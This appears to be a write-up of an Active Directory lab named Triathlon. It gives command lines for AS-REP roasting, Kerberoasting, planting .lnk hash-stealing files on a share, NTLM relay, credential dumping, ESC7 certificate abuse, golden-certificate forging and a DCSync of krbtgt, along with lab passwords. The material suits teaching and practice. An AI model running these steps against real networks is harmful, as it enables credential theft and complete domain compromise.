---
title: "HackSmarter Triathlon Walkthrough  "
date: 2026-06-05 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


<img width="2000" height="1120" alt="image" src="https://github.com/user-attachments/assets/b80b01c6-dc71-47fc-aa16-27a02aedf7fe" />


## Objective / Scope :

The 2025 U.S. Elite Triathlon National Team has requested a penetration test on its internal network. They have granted access to their network via VPN, but no other information has been provided. Successful testers should prove full compromise by providing the NTLM hash for the "krbtgt" account.

Treat this like a real engagement, keeping in mind that only the lab environment assets are in scope for active testing.


## Solution : 

So we are given 3 IP addresses , we first start by scanning them to have a better idea on each of these machines .

<img width="1633" height="834" alt="image" src="https://github.com/user-attachments/assets/bda41a16-d5e9-4f81-9bc7-3b817107f76f" />

Looking at the open ports , we can tell all of these are windows machine , for this we will use nxc to generate the Hostnames as well as the Domain to add to our /etc/hosts file . 

<img width="1650" height="763" alt="image" src="https://github.com/user-attachments/assets/7f38776c-12f8-4c29-b91e-7de396f52e2e" />

Now let's go back to our scans to tell which one is the DC . 

<img width="1387" height="776" alt="image" src="https://github.com/user-attachments/assets/f0b3acd0-02d7-4353-937c-439187e7b481" />

From these open ports we can tell that : 

Run-Server : This is the DC (Kerberos / LDAP / DNS open on it ) so it would make more sense . 

Bike-Server : This one has a Web app running on it , Fuzzing it didn't return any additional endpoints . 

Swim-Server : This is just a Windows machine , Winrm , RDP open but nothing out of the ordinary . 

Since this is an AD Lab , i always like to keep this quick checklist in mind : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

My goal here is to gather a list of usernames for ASREPROASTING since i don't really see another way in , First we use nxc to check if we can get users via anonymous access :

<img width="1348" height="739" alt="image" src="https://github.com/user-attachments/assets/0ed223ae-31b8-4332-89ac-17175b440556" />

This didn't work , checked Shares as well but guest account is disabled, RPC and ldap using ldapsearch but that did't work either . 

<img width="1413" height="750" alt="image" src="https://github.com/user-attachments/assets/ed6dc147-2a64-492e-ad44-df0871e83c2a" />

This didn't work either , so for now all we got is a web server running on the Bike-Server machine , and some additional information about the Company . Maybe OSINT is our way in .

If we read the Objective we find that They are talking about a 2025 U.S. Elite Triathlon National Team , quick search online : 

<img width="1048" height="779" alt="image" src="https://github.com/user-attachments/assets/a9f5fb3d-3efb-4fc9-b36c-be8bafd82570" />

Perfect we find a lot of names , first thing that we shouuld do is put them in a file and use a tool like username anarchy to try and get all the combinations possible of those names, from there we can use Kerbrute to validate our usernames . 

```bash
wget https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py
python3 username-generator.py -u username.txt -o genrated_username.txt
```

<img width="1074" height="733" alt="image" src="https://github.com/user-attachments/assets/d37ac856-005c-4fb8-b97f-45ce197f5e51" />

Now let's test these usernames : 

<img width="1090" height="524" alt="image" src="https://github.com/user-attachments/assets/d378211d-03c9-4cc3-b080-62bc8241c770" />

Perfect Found 3 valid users that we can test for ASREPROASTING :

<img width="1239" height="416" alt="image" src="https://github.com/user-attachments/assets/aea9917d-af6a-45aa-aa79-fd7b32c3a082" />

T.spivey is vulnerable to ASREPROASTING , but we can't seem to be able to crack his hash . 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt Hashes.txt 
hashcat -m 18200 Hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```

I used both John and Hashcat with best66 rules which adds some mutations to each password to make it more complex and have a higher chance . (Seen it on a different Box before that's why i always try it whenever Rockyou doesn't crack the Hash at the first try )

<img width="1216" height="754" alt="image" src="https://github.com/user-attachments/assets/4f68c6db-14b0-4b36-8fa0-b43606d9fa09" />

Now we're kinda stuck here , the only thing we can really do is use impacket to extract the TGT from the ASREP , then use that to request a TGS for a service account , and hope we can crack that service Hash :) 

In a normal setup we would need valid Creds (username and a password) to be able to perform Kerberoasting , but this time we have a user that doesn't have PRE_AUTH which allows us to perform Kerberoasting using his account , the only difference is , we HAVE to specify the accounts that we want to test , since we don't have vcalid creds we can't query LDAP for users with an SPN , so we must specify the service names ...

Impacket GetuserSPN allows us to do this by using the -no-preauth Flag . 

```bash
impacket-GetUserSPNs -no-preauth t.spivey tri.lab/ -dc-ip $DC_IP  -usersfile Valid_Users  -outputfile kerb_hash
```

<img width="1453" height="594" alt="image" src="https://github.com/user-attachments/assets/0ba42ded-7c3a-41f2-bfe8-5f36e297aab4" />

Luckily for us the user J.reed has an SPN which means he is Kerberoastable . Now let's try to crack it (Rock you wasn't enouug again , so i used the best66 rules on Hashcat) :

<img width="1467" height="747" alt="image" src="https://github.com/user-attachments/assets/50c195b1-be02-4ae7-b7bc-8073ed0267d6" />

Now that we've got valid set of credentials , i checked the shares first , but only found the default ones (we will check shares on other machines as well if we're stuck). 

From there i tried generating a list of all users , to try ASREPROASTING again in case we missed a user . After that i also tested Kerberoasting against service accounts now that we are able to query the ldap server ..

```bash
 nxc smb $DC_IP -u 'j.reed' -p 'Utah123' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee all_users  
```

<img width="1625" height="823" alt="image" src="https://github.com/user-attachments/assets/31255f33-6fd3-4118-bf47-e0b606cdd4b4" />

No additional ASREPROASTable users !) , let's check Kerberoasting :

<img width="1172" height="764" alt="image" src="https://github.com/user-attachments/assets/f1ac3a1b-9815-4c57-b3ac-c50b002de913" />

Again , only the jreed user . Tried spraying the password on all the other users but that didn't work either , also the j.reed user can't winrm nor rdp to the DC . 

Now let's move to the other machines , to see if we can access any of them via rdp or winrm as the j.reed user . 

<img width="1100" height="743" alt="image" src="https://github.com/user-attachments/assets/3b7b50d0-b525-421b-935a-44bd84956fba" />

No winrm , RDP nor admin privileges on any of the machines . 

==> Shares :

Now let's check if our user can access any of the shares on the other machines since we only tested the DC . 

<img width="1132" height="741" alt="image" src="https://github.com/user-attachments/assets/d6b95f9d-4b17-4672-a473-b9c167e0e840" />

Perfect, our user has access to the share TransitionZone on the SWIM-server machine . We also see that we have WRITE access . Always, if we have Write access to a share, think about uploading an .lnk file that will connect back to our machine so that we can steal a hash. If we see that there is a web server that hosts files from that share, we can always try and upload an ASPX reverse shell or just a webshell (depends on the technology used, but since it's Windows it's most probably going to be ASP or ASPX). After that, we can execute it and get a shell as the web server user in some cases.

For this one i will use nxc to make life easier , if it doesn't work i will try a recent CVE that usually works on other labs . But in case you wanted to try NTLM theaft :

```bash
# NTLM Theaft :
https://github.com/Greenwolf/ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit"     

# For the CVE :
https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

# Using NXC :
nxc smb SWIM-SRV -u 'j.reed' -p 'Utah123' --shares -M slinky -o NAME=CLICKKKK_pls  SERVER=10.200.62.168

```

<img width="1693" height="780" alt="image" src="https://github.com/user-attachments/assets/c8a5411e-cbe6-4e46-bd61-bba6243e9a15" />

We got the NTLMV2 of the user e.ackerlund . Now let's try to crack it :

<img width="1376" height="722" alt="image" src="https://github.com/user-attachments/assets/3126052e-3db9-4578-90a7-cdca32aa7bea" />

Againt Rockyou doesn't work , even with best66 rule -_- .

Luckily for us , this is Windows and there is something called NTLM Relay that we can abuse . In case we had the NTLMV2 , well we can always relay it to a machine to athenticate to that machine as long as the machine doesn't have SMB signing or LDAP signing on.

First we need to get a list of machines that don't have SMB Signing on , we can do that using nxc . 

<img width="1729" height="342" alt="image" src="https://github.com/user-attachments/assets/d72c86c7-91dd-404c-88e4-3b07bb4150b3" />

Although nxc shows that they have SMB Signing on , we should always verify using nmap :

<img width="873" height="779" alt="image" src="https://github.com/user-attachments/assets/4e356e3a-b8fa-4e6b-b744-3e25966aa997" />

As we can see SMB signing isn't required for the 2 machines other than the DC . 

```bash
nmap -p 139,445 --script smb-security-mode,smb2-security-mode -Pn -iL targets
nxc smb targets  --gen-relay-list relay_targets.txt
```

Now that we got a list of machines with No SMB Signing , we can run our relay server using ntlmrelay which will capture the user's NTLMV2 and forward it to the machine to authenticate as that user . 

One thing to note is that Windows by default blocks the NTLM coming from the same machine , this is what's called a reflection attack so unless we have a CVE that can cause it (which exists) we can't relay to the same machine .

So we will only try and relay to the other machine (Bike-Server)

<img width="1035" height="791" alt="image" src="https://github.com/user-attachments/assets/56ecab06-4ebc-44a9-b603-412ba1f90c8a" />

Now we just wait for the user to open the INK file we alreay put in the Share :

<img width="1244" height="721" alt="image" src="https://github.com/user-attachments/assets/7b39a4a4-c251-4924-86d6-b25016b871d3" />

Perfect , e.ackerlund is local admin on that machine even , so we are able to dump the SAM and get admin Hash . 

We will use this Administrator Hash to dump the lsass process which might contain other domain users not just local ones . 

<img width="1711" height="343" alt="image" src="https://github.com/user-attachments/assets/0f75f47d-a131-4b3c-a712-684a40edf715" />

We can dump the hashes using nxc . 

<img width="1876" height="587" alt="image" src="https://github.com/user-attachments/assets/67acffec-42a5-4f7d-8971-d728da6d1ffc" />

We are able to dump the DCC2 hash for the m.peterson user . 

The DCC2 hash is the hash the machine caches whenever a domain user logs in locally. We can’t use it to authenticate over the network via SMB, LDAP, etc. So the only option is to crack it offline.

The mode for the DCC2 hash is 2100 :

```bash
hashcat -m 2100 mpearson_hash /usr/share/wordlists/rockyou.txt
```

<img width="1062" height="792" alt="image" src="https://github.com/user-attachments/assets/c87f177e-dce3-4c7c-9c2d-cd2208fb6f40" />

We are able to crack it , we see that our user has Admin privileges on the SWIM-SRV .

<img width="1178" height="380" alt="image" src="https://github.com/user-attachments/assets/1bd8d3e3-c41c-44f4-8792-d42f311eb071" />

Let's try to dump Hashes .

<img width="1660" height="583" alt="image" src="https://github.com/user-attachments/assets/d56d3394-bf2a-417b-9699-6604136e8c65" />

We don't find any additional users . 

Let's check Bloodhound , to see if this user has any important ACLs we can abuse . 

Steps to setup BloodHound : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1809" height="471" alt="image" src="https://github.com/user-attachments/assets/c760d88f-75b0-4c2f-8bda-4bf7b475da40" />

If we check Bloodhound :

<img width="1474" height="438" alt="image" src="https://github.com/user-attachments/assets/e10b35ed-fd6e-4bb6-a7e0-33966219ff90" />

Our user has no Outbound object control , no important groups . Let's check certipy to see if we have any vulnerable templates :

```bash
certipy-ad find -u m.pearson -p 2silver -dc-ip $DC_IP -stdout -vulnerable
```

<img width="1199" height="777" alt="image" src="https://github.com/user-attachments/assets/04310170-c5f5-4990-b085-91d20bcf206a" />

Certipy doesn't find anything .

BUT The CA server is the SWIM-SRV , so we're basically Admin on the machine that issues the Certs , we can also check BloodHound and it will show that we are part of the CA publisher group (makes sense We are the CA server litteraly)

<img width="1498" height="486" alt="image" src="https://github.com/user-attachments/assets/94d6de7a-63e9-433f-8248-1aa23201f3c9" />

### Abusing Admin on the CA machine : 

Now there are 2 ways we can abuse this :

#### ESC7 

So basically we have Manage CA permissions over the Certificate Authority. What this lets us do is enable the SubCA template which is a special built in template that allows us to specify whoever we want as the subject of the certificate meaning we can say "issue this cert for Administrator". We request it, the CA denies us because we don't have direct enrollment rights on SubCA, but here's the sneaky part — the request still gets logged with a Request ID, and our private key gets saved locally. Now we use our Manage CA permission again, but this time to just approve our own denied request. Once approved we retrieve the certificate and now we have a valid cert authenticating us as Administrator game over.

More details on how the attack works : 

```bash
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
```

Now if we follow the wiki this is the attack path : 

```bash
# 1. Add yourself as officer (Manage CA → officer role)
certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -add-officer m.pearson

# 2. Enable SubCA template
certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -enable-template SubCA

# 3. Request cert for DA (will fail, save private key when prompted!)
certipy-ad req -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -template SubCA -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109

# 4. Approve your own denied request
certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -issue-request <ID>

# 5. Retrieve the cert
certipy-ad req -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -retrieve <ID>

# 6. Authenticate using the Certificate :
certipy-ad auth -pfx j.reed_adm.pfx -dc-ip $DC_IP -username j.reed_adm -domain tri.lab

# 7. DCSync
impacket-secretsdump tri.lab/j.reed_adm@RUN-SRV.tri.lab -hashes :NTHASH -just-dc-user krbtgt

```

First we change our role to officer (if needed) then we enable the SubCA template which is vulnerable then we request a certificate on behalf of a DA , which will fail but we can save our private key and keep the ID in mind .

<img width="1902" height="657" alt="image" src="https://github.com/user-attachments/assets/f8371725-b1ca-4064-98b4-ff340733d26f" />

Now that we got our ID , we can approve the request using the request ID and from there we retrieve our cert . 

<img width="1521" height="449" alt="image" src="https://github.com/user-attachments/assets/9f515910-1692-46d5-ac9e-3a6e66d8d6ad" />

And finally we can use that cert to authenticate : 

<img width="1339" height="476" alt="image" src="https://github.com/user-attachments/assets/c82d83b2-1dcb-4ded-aadb-6cc6939bc5c3" />

Now there is another way to exploit this Admin on the CA machine . 


#### Golden Certificate : 

Just like with a Golden ticket , we got the KRBTGT Hash and we can generate tickets for anyone with any permission we want , the Goiden Cert is the same thing , we got the CA private key that is used to sign ALL the certificates that the CA assigns , so to make it simple , we steal the Private Key of the CA and use it to sign any certificate on behalf of any user we want (And we can do this OFFLINE !!!!) , and finally authenticate as that user .

Now the Attack path is this :

```bash
# 1. Backup the CA certificate and private key
certipy-ad ca -backup -ca 'tri-CA' -username m.pearson@tri.lab -password 2silver -dc-ip $DC_IP -target SWIM-SRV.tri.lab

# 2. Forge a certificate offline for DA using stolen CA key
certipy-ad forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 -crl ldap:///

# 4. Authenticate with forged cert and get NT hash
certipy-ad auth -pfx j.reed_adm_forged.pfx -dc-ip $DC_IP -username j.reed_adm -domain tri.lab

# 5. DCSync for krbtgt
impacket-secretsdump tri.lab/j.reed_adm@RUN-SRV.tri.lab -hashes :NTHASH -just-dc-user krbtgt
```

We first backup the CA and private key , then request the Ticket for the user : 

<img width="1708" height="801" alt="image" src="https://github.com/user-attachments/assets/7701c560-da57-472e-bb37-c2237780568d" />

From there we just authenticate as that user , pretty simple !

<img width="1574" height="763" alt="image" src="https://github.com/user-attachments/assets/795c462b-c973-4c28-9167-817379268933" />

And finally we perform our DCSync using the DA Hash since we got it when we authenticated using the pfx cert . 

That was all for this lab , Lot of fun , with OSINT at the beguinning and Golden Cert attack at the end . See you in the next one :)

